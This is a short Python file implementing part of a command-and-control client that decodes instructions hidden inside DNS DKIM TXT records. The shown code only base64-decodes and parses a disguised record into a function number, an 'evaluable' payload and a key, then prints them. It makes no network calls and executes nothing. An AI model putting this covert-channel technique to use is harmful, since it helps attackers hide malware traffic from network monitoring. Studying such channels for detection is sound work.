#!/usr/bin/python
# -*- coding: utf8 -*-

import random
import string
import base64


class Client:
    """ Simple implementation of a C2 client acting as a DNS requester that receives
    information via a DKIM records.

        :param c2s_ip: C2 server IP address
        :param target_domain: Domain to ask for
    """

    ASCII_VALUE_CHAR = {x:chr(x) for x in range(0,128)}

    def __init__(self, c2s_ip: str, target_domain: str):
        self.c2s_ip = c2s_ip
        self.target_domain = target_domain

    @property
    def port(self, p):
        return self._port

    @port.setter
    def port(self, v):
        self._port = v

        # Assert port value
        assert 1 <= v <= 65535

    @staticmethod
    def decode(pk: str) -> (None, str):
        """ Applies the algorithm described in the repository to decipher and decode a given Public Key
        from the DNS DKIM TXT record.

        :param pk: Public decodable key
        :return: Public key
        """

        pk = base64.b64decode(pk).decode('utf8')

        function_number = int(pk[0:2][::-1], 16)
        separator = Client.ASCII_VALUE_CHAR[ord(pk[2]) + ord(pk[3])]
        evaluable_length = ord(pk[4]) + ord(pk[5])
        to_decrypt = pk[7:7+evaluable_length]
        key = pk[7+evaluable_length:]

        print('[+] Function number:{}'.format(function_number))
        print("[+] Separator: {}".format(separator))
        print('[+] Evaluable information length: {}'.format(evaluable_length))
        print('[+] Key:{}'.format(repr(key)))


if __name__ == '__main__':
    c = Client('127.0.0.1', 'example.com')
    c.decode('MTADJRIVKHYNZRkcd2kvWl4vXxA7SisGbgVTGE4rGS5KVTZ+U1VdCglWOCw2BD5oCXVzVz5AKDJLfjhyakprTnUhcSBfcEAtdUIJPHUufns/VktFJUgJIXNJQiVebn4ufHRVUW1NSUNLXzYLOSYxWl5mIXJnZHJ+Ny8yY2RGRQ0=')
